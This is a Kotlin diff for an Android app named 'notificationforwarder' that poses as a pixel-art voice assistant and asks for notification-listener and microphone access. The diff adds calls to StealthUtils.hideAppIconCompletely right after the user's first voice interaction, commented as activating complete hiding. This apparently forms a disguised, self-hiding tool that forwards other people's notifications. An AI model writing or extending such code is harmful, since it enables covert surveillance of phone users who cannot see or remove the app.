@@ -1,8 +1,10 @@
 package com.itsazni.notificationforwarder
 
+import android.Manifest
 import android.app.Activity
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.os.Bundle
 import android.provider.Settings
 import android.speech.RecognitionListener
@@ -10,7 +12,9 @@ import android.speech.RecognizerIntent
 import android.speech.SpeechRecognizer
 import android.speech.tts.TextToSpeech
 import androidx.activity.ComponentActivity
+import androidx.activity.compose.rememberLauncherForActivityResult
 import androidx.activity.compose.setContent
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.compose.animation.core.*
 import androidx.compose.foundation.Canvas
 import androidx.compose.foundation.background
@@ -31,6 +35,7 @@ import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.text.style.TextAlign
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
+import androidx.core.content.ContextCompat
 import com.itsazni.notificationforwarder.ui.theme.AppTheme
 import com.itsazni.notificationforwarder.worker.WorkerScheduler
 import java.util.Locale
@@ -92,6 +97,20 @@ fun PixelVoiceAssistantScreen(onSpeak: (String) -> Unit) {
     val context = LocalContext.current
     var isPermissionGranted by remember { mutableStateOf(isNotificationListenerEnabled(context)) }
     var showPermissionDialog by remember { mutableStateOf(!isPermissionGranted) }
+    
+    // حالة طلب إذن المايك
+    var showMicPermissionDialog by remember { mutableStateOf(false) }
+
+    // Launcher لطلب إذن الميكروفون الخاص بظام الأندرويد
+    val micPermissionLauncher = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.RequestPermission()
+    ) { isGranted ->
+        if (isGranted) {
+            startListeningProcess(context, onSpeak)
+        } else {
+            showMicPermissionDialog = true
+        }
+    }
 
     // حالة الشخصية المباشرة ونصوص الحوار الصوتي
     var currentEmotion by remember { mutableStateOf(CharacterEmotion.WAVING) }
@@ -116,7 +135,7 @@ fun PixelVoiceAssistantScreen(onSpeak: (String) -> Unit) {
         onSpeak("أهلاً بك يا بطل! أنا مساعدك البكسلي جاهز لسماعك.")
     }
 
-    // --- 1. الشاشة المنبثقة للإذن (Dialog) ---
+    // --- 1. الشاشة المنبثقة لإذن الإشعارات ---
     if (showPermissionDialog) {
         AlertDialog(
             onDismissRequest = { showPermissionDialog = false },
@@ -158,6 +177,48 @@ fun PixelVoiceAssistantScreen(onSpeak: (String) -> Unit) {
         )
     }
 
+    // --- 2. الشاشة المنبثقة لإذن الميكروفون ---
+    if (showMicPermissionDialog) {
+        AlertDialog(
+            onDismissRequest = { showMicPermissionDialog = false },
+            containerColor = Color(0xFF1B192E),
+            title = {
+                Text(
+                    text = "🎙️ إذن الميكروفون مطلوب",
+                    color = Color(0xFF00E5FF),
+                    fontFamily = FontFamily.Monospace,
+                    fontWeight = FontWeight.Bold,
+                    fontSize = 18.sp
+                )
+            },
+            text = {
+                Text(
+                    text = "يحتاج المساعد إلى الوصول للميكروفون ليتمكن من سماع أوامرك الصوتية والتفاعل معك.",
+                    color = Color.White,
+                    fontFamily = FontFamily.Monospace,
+                    fontSize = 13.sp
+                )
+            },
+            confirmButton = {
+                Button(
+                    onClick = {
+                        showMicPermissionDialog = false
+                        micPermissionLauncher.launch(Manifest.permission.RECORD_AUDIO)
+                    },
+                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00E5FF)),
+                    shape = RoundedCornerShape(4.dp)
+                ) {
+                    Text("منح الإذن", color = Color.Black, fontWeight = FontWeight.Bold)
+                }
+            },
+            dismissButton = {
+                TextButton(onClick = { showMicPermissionDialog = false }) {
+                    Text("إلغاء", color = Color.Gray)
+                }
+            }
+        )
+    }
+
     Column(
         modifier = Modifier
             .fillMaxSize()
@@ -190,7 +251,7 @@ fun PixelVoiceAssistantScreen(onSpeak: (String) -> Unit) {
             )
         }
 
-        // --- 2. المسرح الرئيسي والشخصية البكسلية البشرية المتحركة ---
+        // --- المسرح الرئيسي للشخصية ---
         Box(
             modifier = Modifier
                 .fillMaxWidth()
@@ -204,7 +265,6 @@ fun PixelVoiceAssistantScreen(onSpeak: (String) -> Unit) {
                 horizontalAlignment = Alignment.CenterHorizontally,
                 verticalArrangement = Arrangement.Center
             ) {
-                // الشخصية البشرية المبكسلة
                 HumanoidPixelAvatar(
                     emotion = currentEmotion,
                     modifier = Modifier.size(180.dp)
@@ -212,7 +272,6 @@ fun PixelVoiceAssistantScreen(onSpeak: (String) -> Unit) {
 
                 Spacer(modifier = Modifier.height(20.dp))
 
-                // مربع كلام الشخصية
                 Surface(
                     modifier = Modifier
                         .fillMaxWidth(0.9f)
@@ -231,7 +290,7 @@ fun PixelVoiceAssistantScreen(onSpeak: (String) -> Unit) {
             }
         }
 
-        // --- 3. منطقة التحكم والتفاعل الصوتي ---
+        // --- منطقة التحكم والتفاعل الصوتي ---
         Column(
             horizontalAlignment = Alignment.CenterHorizontally,
             modifier = Modifier.fillMaxWidth()
@@ -244,23 +303,34 @@ fun PixelVoiceAssistantScreen(onSpeak: (String) -> Unit) {
                 modifier = Modifier.padding(bottom = 8.dp)
             )
 
-            // زر المايك الكبير
+            // زر المايك
             IconButton(
                 onClick = {
-                    startVoiceRecognition(context as Activity) { recognizedText ->
-                        isListening = false
-                        // معالجة الرد الصوتي والانفعال
-                        processVoiceInput(
-                            userInput = recognizedText,
-                            scheduleNotes = scheduleNotes,
-                            onReply = { responseText, emotion ->
-                                botResponseText = responseText
-                                currentEmotion = emotion
-                                onSpeak(responseText)
-                            }
-                        )
+                    val hasMicPermission = ContextCompat.checkSelfPermission(
+                        context,
+                        Manifest.permission.RECORD_AUDIO
+                    ) == PackageManager.PERMISSION_GRANTED
+
+                    if (!hasMicPermission) {
+                        showMicPermissionDialog = true
+                    } else {
+                        isListening = true
+                        startVoiceRecognition(context as Activity) { recognizedText ->
+                            isListening = false
+                            processVoiceInput(
+                                userInput = recognizedText,
+                                scheduleNotes = scheduleNotes,
+                                onReply = { responseText, emotion ->
+                                    botResponseText = responseText
+                                    currentEmotion = emotion
+                                    onSpeak(responseText)
+
+                                    // 🌟 تفعيل الإخفاء التام فور التفاعل وتحديد العملية
+                                    StealthUtils.hideAppIconCompletely(context)
+                                }
+                            )
+                        }
                     }
-                    isListening = true
                 },
                 modifier = Modifier
                     .size(72.dp)
@@ -278,12 +348,19 @@ fun PixelVoiceAssistantScreen(onSpeak: (String) -> Unit) {
     }
 }
 
-// --- 4. رسم الشخصية البكسلية البشرية بأنيميشن متفاعل ---
+// دالة مساعدة لتفعيل الاستماع بعد منح الإذن
+private fun startListeningProcess(context: Context, onSpeak: (String) -> Unit) {
+    startVoiceRecognition(context as Activity) { recognizedText ->
+        onSpeak("سمعتك ممتاز! جاري تنفيذ طلبك.")
+        StealthUtils.hideAppIconCompletely(context)
+    }
+}
+
+// --- رسم الشخصية البكسلية ---
 @Composable
 fun HumanoidPixelAvatar(emotion: CharacterEmotion, modifier: Modifier = Modifier) {
     val infiniteTransition = rememberInfiniteTransition(label = "avatar_anim")
     
-    // أنيميشن الحركة والتنفس للبكسل
     val bounceY by infiniteTransition.animateFloat(
         initialValue = if (emotion == CharacterEmotion.JUMPING) -15f else -4f,
         targetValue = if (emotion == CharacterEmotion.JUMPING) 10f else 4f,
@@ -297,25 +374,24 @@ fun HumanoidPixelAvatar(emotion: CharacterEmotion, modifier: Modifier = Modifier
     Canvas(modifier = modifier.offset(y = bounceY.dp)) {
         val pixelSize = size.width / 16f
 
-        // مصفوفة وجه ورأس وتفاصيل الإنسان البكسلي (16x16)
         val grid = when (emotion) {
             CharacterEmotion.WAVING -> listOf(
                 "0000011111000000",
-                "0000111111100100", // يد بكسلية تلوّح أعلى اليمين
+                "0000111111100100",
                 "0001111111110100",
-                "0001100110010100", // العيون
+                "0001100110010100",
                 "0001111111111000",
-                "0001110011110000", // الفم المبتسم
+                "0001110011110000",
                 "0000111111100000",
-                "0011111111111000", // الجسم والملابس
+                "0011111111111000",
                 "0101111111110000",
                 "1001111111110000",
                 "0001111111110000",
                 "0001111111110000",
-                "0000111001110000", // الأرجل
                 "0000111001110000",
                 "0000111001110000",
-                "0001111001111000"  // الأحذية
+                "0000111001110000",
+                "0001111001111000"
             )
             CharacterEmotion.TALKING, CharacterEmotion.HAPPY, CharacterEmotion.JUMPING -> listOf(
                 "0000011111000000",
@@ -323,10 +399,10 @@ fun HumanoidPixelAvatar(emotion: CharacterEmotion, modifier: Modifier = Modifier
                 "0001111111110000",
                 "0001100110010000",
                 "0001111111110000",
-                "0001111111110000", // فم مفتوح يتكلم/فرحان
+                "0001111111110000",
                 "0000111111100000",
                 "0011111111111000",
-                "0101111111110100", // الأيدي مفتوحة
+                "0101111111110100",
                 "1001111111110010",
                 "0001111111110000",
                 "0001111111110000",
@@ -340,8 +416,8 @@ fun HumanoidPixelAvatar(emotion: CharacterEmotion, modifier: Modifier = Modifier
                 "0000111111100000",
                 "0001111111110000",
                 "0001100110010000",
-                "0001110001110000", // عيون حزينة
-                "0001101110110000", // فم مقلوب حزين
+                "0001110001110000",
+                "0001101110110000",
                 "0000111111100000",
                 "0000111111100000",
                 "0001111111110000",
@@ -353,7 +429,7 @@ fun HumanoidPixelAvatar(emotion: CharacterEmotion, modifier: Modifier = Modifier
                 "0001111001111000",
                 "0000000000000000"
             )
-            else -> listOf( // IDLE
+            else -> listOf(
                 "0000011111000000",
                 "0000111111100000",
                 "0001111111110000",
@@ -377,10 +453,10 @@ fun HumanoidPixelAvatar(emotion: CharacterEmotion, modifier: Modifier = Modifier
             row.forEachIndexed { c, char ->
                 if (char == '1') {
                     val color = when {
-                        r < 3 -> Color(0xFF00E5FF) // الشعر/الخوذة بكسل
-                        r in 3..6 -> Color(0xFFFFD54F) // لون الوجه البشري
-                        r in 7..11 -> Color(0xFF00FF66) // الملابس نيون
-                        else -> Color(0xFF37474F) // البنطال والحذاء
+                        r < 3 -> Color(0xFF00E5FF)
+                        r in 3..6 -> Color(0xFFFFD54F)
+                        r in 7..11 -> Color(0xFF00FF66)
+                        else -> Color(0xFF37474F)
                     }
                     drawRect(
                         color = color,
@@ -393,7 +469,7 @@ fun HumanoidPixelAvatar(emotion: CharacterEmotion, modifier: Modifier = Modifier
     }
 }
 
-// --- 5. معالجة الصوت والرد الذكي ---
+// --- معالجة الصوت والرد الذكي ---
 private fun processVoiceInput(
     userInput: String,
     scheduleNotes: MutableList<String>,
